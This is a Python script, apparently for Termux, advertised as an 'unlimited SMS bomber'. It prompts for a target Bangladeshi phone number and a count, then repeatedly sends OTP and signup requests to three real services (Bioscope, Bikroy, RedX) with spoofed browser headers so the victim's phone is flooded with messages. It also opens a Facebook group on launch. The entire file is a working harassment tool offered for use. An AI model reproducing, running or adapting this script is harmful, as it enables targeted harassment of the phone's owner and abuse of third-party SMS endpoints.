#Coding: MUMIT ISLAM HIMU
#Facebook: Mumit Islam
#Github: MUMIT-404-CYBER
#--------------------------------------------------------------#
import os,requests,time
time.sleep(1)
os.system("xdg-open https://facebook.com/groups/termuxteambd/")
os.system("clear")
logo = ("""
\033[1;91m    _____   ___   ______  _____________   ________
\033[1;92m   /  _/ | / / | / / __ \/ ____/ ____/ | / /_  __/
\033[1;93m   / //  |/ /  |/ / / / / /   / __/ /  |/ / / /   
\033[1;94m _/ // /|  / /|  / /_/ / /___/ /___/ /|  / / /    
\033[1;95m/___/_/ |_/_/ |_/\____/\____/_____/_/ |_/ /_/     \033[1;92m
 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 ┃ [\033[1;91m✓\033[1;92m] AUTHOR    \033[1;91m: \033[1;92mMUMIT ISLAM HIMU           ┃
 ┃ [\033[1;91m✓\033[1;92m] TOOLS     \033[1;91m: \033[1;92mUNLIMITED SMS BOMBER       ┃
 ┃ [\033[1;91m✓\033[1;92m] STATUS    \033[1;91m: \033[1;92mFREE                       ┃
 ┃ [\033[1;91m✓\033[1;92m] SYSTEM    \033[1;91m: \033[1;92mDATA & WIFI                ┃
 ┃ [\033[1;91m✓\033[1;92m] GITHUB    \033[1;91m: \033[1;92mMUMIT-404-CYBER            ┃
 ┃ [\033[1;91m✓\033[1;92m] FACEBOOK  \033[1;91m: \033[1;92mMumit Islam Himu           ┃
 ┃ [\033[1;91m✓\033[1;92m] WHATSAPP  \033[1;91m: \033[1;92m+8801644777***             ┃
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
print(logo)
print(""" ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 ┃     🎭 WELCOME TO SMS BOMBER TOOLS 🎭      ┃
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
num=input("""  \033[1;32m[!] PUT TARGET NUMBER :\033[1;91m +880""")
print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
amount=int(input("  \033[1;32m[!] PUT SMS LIMIT :\033[1;91m "))
print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
headers1={
			  "authority":"www.bioscopelive.com",
			  "method":"GET",
			  "scheme":"https",
			  "accept":"*/*",
			  "accept-encoding":"gzip, deflate, br",
			  "accept-language":"en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7",
			  "if-none-match":'W/"5baf0d010507bc980255f9941283860a"',
			  "referer":"https://www.bioscopelive.com/en/login?bongoId=QPj10yOQIwI",
			  "save-data":"on",
			  "sec-ch-ua":'"Chromium";v="107", "Not=A?Brand";v="24"',
			  "sec-ch-ua-mobile":"?1",
			  "sec-ch-ua-platform":'Android',
			  "sec-fetch-dest":"empty",
			  "sec-fetch-mode":"cors",
			  "sec-fetch-site":"same-origin",
			  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
			  "x-requested-with":"XMLHttpRequest"
}
url1="https://www.bioscopelive.com/en/login/send-otp?phone=880"+num+"&operator=bd-otp"
headers2={
         "referer":"https://bikroy.com/bn/users/login?action=login&stack=webapp&redirect-url=/bn/users/login-options",
         "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
}
url2="https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0"+num
data={
  "name": num,
  "phoneNumber": num,
  "service": "redx"
}
headers3={
  "referer":"https://redx.com.bd/",
  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
}
ses=0
while amount>ses:
  sent1=requests.get(url1,headers=headers1)
  if sent1.status_code==200:
    ses+=1
    print(f"{ses} \033[1;32m[✓] SMS SENT BY INNOCENT BOMBER 🎭")
    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
  else:
    pass
  
  sent2=requests.get(url2,headers=headers2)
  if sent2.status_code==200:
    ses+=1
    print(f"{ses} \033[1;32m[✓] SMS SENT BY INNOCENT BOMBER 🎭")
    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
  else:
    pass
  
  send3=requests.post("https://api.redx.com.bd/v1/user/signup",headers=headers3,data=data)
  if send3.status_code==200:
    ses+=1
    print(f"{ses} \033[1;32m[✓] SMS SENT BY INNOCENT BOMBER 🎭")
    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    
  else:
    pass
os.system("clear")
print(logo)
print(""" ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 ┃       🎭 SMS SENT ALMOST COMPLETE 🎭       ┃
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
print(" Thanks For Using My Tool...")